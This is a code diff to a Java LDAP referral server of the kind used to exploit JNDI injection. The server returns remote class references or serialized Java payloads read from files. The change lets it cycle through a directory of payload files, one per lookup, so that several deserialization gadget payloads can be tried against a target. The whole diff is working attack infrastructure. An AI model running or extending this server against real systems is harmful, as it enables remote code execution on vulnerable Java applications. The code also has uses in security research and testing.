@@ -30,6 +30,10 @@ import java.net.InetAddress;
 import java.net.MalformedURLException;
 import java.net.URL;
 
+import java.nio.file.Paths;
+import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.List;
 import javax.net.ServerSocketFactory;
 import javax.net.SocketFactory;
 import javax.net.ssl.SSLSocketFactory;
@@ -67,7 +71,9 @@ public class LDAPRefServer {
         else if ( args.length > 1 ) {
             port = Integer.parseInt(args[ 1 ]);
         }
-        file = args[2];
+        if (args.length >= 3) {
+            file = args[2];
+        }
 
         try {
             InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
@@ -121,6 +127,8 @@ public class LDAPRefServer {
 
         }
 
+        private static final List<File> files = new ArrayList<>();
+        private static int count = 0;
 
         protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
             URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
@@ -136,8 +144,23 @@ public class LDAPRefServer {
                 e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
                 e.addAttribute("javaFactory", this.codebase.getRef());
             } else {
+                File sendFile = null;
+                if (Paths.get(file).toFile().isDirectory()) {
+                    if (files.isEmpty()) {
+                        files.addAll(Arrays.asList(Paths.get(file).toFile().listFiles()));
+                    }
+                    if (!files.isEmpty()) {
+                        sendFile = files.get((count++) % files.size());
+                    }
+                } else {
+                    sendFile = new File(file);
+                }
+                if (sendFile == null) {
+                    System.out.println("dir no file to send!");
+                    return;
+                }
                 try {
-                    FileInputStream fileInputStream = new FileInputStream(new File(file));
+                    FileInputStream fileInputStream = new FileInputStream(sendFile);
                     byte[] bytes = new byte[fileInputStream.available()];
                     fileInputStream.read(bytes);
                     e.addAttribute("javaSerializedData", bytes);
